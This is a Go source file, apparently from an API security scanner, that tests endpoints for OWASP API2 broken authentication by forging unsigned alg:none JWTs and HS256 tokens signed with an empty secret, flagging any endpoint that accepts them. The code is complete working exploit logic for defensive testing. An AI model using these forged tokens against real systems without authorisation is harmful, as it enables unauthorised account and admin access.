// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2024 opensecstack contributors.

package api

// OWASP API2:2023 — Broken Authentication
//
// Simulates two JWT attack vectors:
//   1. Algorithm confusion — sends a token with alg:none (no signature).
//   2. Empty-secret HS256   — signs a token with an empty string secret.
//
// Safety guarantee: production blocklist check runs before any network I/O.

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// AuthBypassAttack simulates OWASP API2 — Broken Authentication.
type AuthBypassAttack struct {
	client *http.Client
}

// NewAuthBypassAttack returns a ready AuthBypassAttack.
func NewAuthBypassAttack() *AuthBypassAttack {
	return &AuthBypassAttack{client: &http.Client{Timeout: 10 * time.Second}}
}

// Run probes each endpoint in params["endpoints"] ([]string) with both attack
// vectors. Any endpoint that returns HTTP 200 or 201 is recorded as evidence.
//
// Recognised params keys:
//   - "endpoints"  []string — paths to probe, e.g. ["/api/profile", "/api/orders"]
//   - "claims"     map[string]any — JWT payload claims to embed
func (a *AuthBypassAttack) Run(ctx context.Context, targetURL string, params map[string]any) (*AttackResult, error) {
	if err := checkTarget(targetURL); err != nil {
		return nil, err
	}

	start := time.Now()
	result := &AttackResult{Technique: "AuthBypass"}

	endpoints := stringSliceParam(params, "endpoints", []string{
		"/api/profile",
		"/api/users/me",
		"/api/orders",
		"/api/admin",
	})

	claims := mapParam(params, "claims", map[string]any{
		"sub":  "attacker",
		"role": "user",
		"iat":  time.Now().Unix(),
		"exp":  time.Now().Add(1 * time.Hour).Unix(),
	})

	algNoneToken, err := buildAlgNoneJWT(claims)
	if err != nil {
		return nil, fmt.Errorf("authbypass: build alg:none token: %w", err)
	}

	emptySecretToken, err := buildEmptySecretHS256JWT(claims)
	if err != nil {
		return nil, fmt.Errorf("authbypass: build empty-secret token: %w", err)
	}

	type probe struct {
		label string
		token string
	}
	probes := []probe{
		{"alg:none", algNoneToken},
		{"HS256-empty-secret", emptySecretToken},
	}

	base := strings.TrimRight(targetURL, "/")

	for _, ep := range endpoints {
		for _, p := range probes {
			select {
			case <-ctx.Done():
				result.Duration = time.Since(start)
				return result, ctx.Err()
			default:
			}

			url := base + ep
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
			if err != nil {
				continue
			}
			req.Header.Set("Authorization", "Bearer "+p.token)
			req.Header.Set("Accept", "application/json")

			resp, err := a.client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				result.Success = true
				result.Evidence = append(result.Evidence,
					fmt.Sprintf("AuthBypass[%s]: GET %s returned HTTP %d — endpoint accepted invalid token (snippet=%q)",
						p.label, url, resp.StatusCode, truncate(string(body), 150)))
			}
		}
	}

	result.Duration = time.Since(start)
	return result, nil
}

// buildAlgNoneJWT constructs a JWT with alg:none and no signature.
func buildAlgNoneJWT(claims map[string]any) (string, error) {
	header := map[string]any{"alg": "none", "typ": "JWT"}
	h, err := jsonBase64(header)
	if err != nil {
		return "", err
	}
	p, err := jsonBase64(claims)
	if err != nil {
		return "", err
	}
	// Trailing dot with empty signature per RFC 7519 §6.
	return h + "." + p + ".", nil
}

// buildEmptySecretHS256JWT constructs an HS256 JWT signed with an empty key.
// Many libraries accept empty secrets when misconfigured.
func buildEmptySecretHS256JWT(claims map[string]any) (string, error) {
	header := map[string]any{"alg": "HS256", "typ": "JWT"}
	h, err := jsonBase64(header)
	if err != nil {
		return "", err
	}
	p, err := jsonBase64(claims)
	if err != nil {
		return "", err
	}
	signingInput := h + "." + p
	sig := hmacSHA256([]byte(""), []byte(signingInput))
	return signingInput + "." + base64.RawURLEncoding.EncodeToString(sig), nil
}

// jsonBase64 JSON-encodes v and returns a base64url (no-padding) string.
func jsonBase64(v any) (string, error) {
	b, err := json.Marshal(v)
	if err != nil {
		return "", err
	}
	return base64.RawURLEncoding.EncodeToString(b), nil
}

// stringSliceParam extracts a []string from params[key], returning def if absent.
func stringSliceParam(params map[string]any, key string, def []string) []string {
	v, ok := params[key]
	if !ok {
		return def
	}
	switch s := v.(type) {
	case []string:
		return s
	case []any:
		var out []string
		for _, item := range s {
			if str, ok := item.(string); ok {
				out = append(out, str)
			}
		}
		return out
	}
	return def
}

// mapParam extracts a map[string]any from params[key], returning def if absent.
func mapParam(params map[string]any, key string, def map[string]any) map[string]any {
	v, ok := params[key]
	if !ok {
		return def
	}
	if m, ok := v.(map[string]any); ok {
		return m
	}
	return def
}
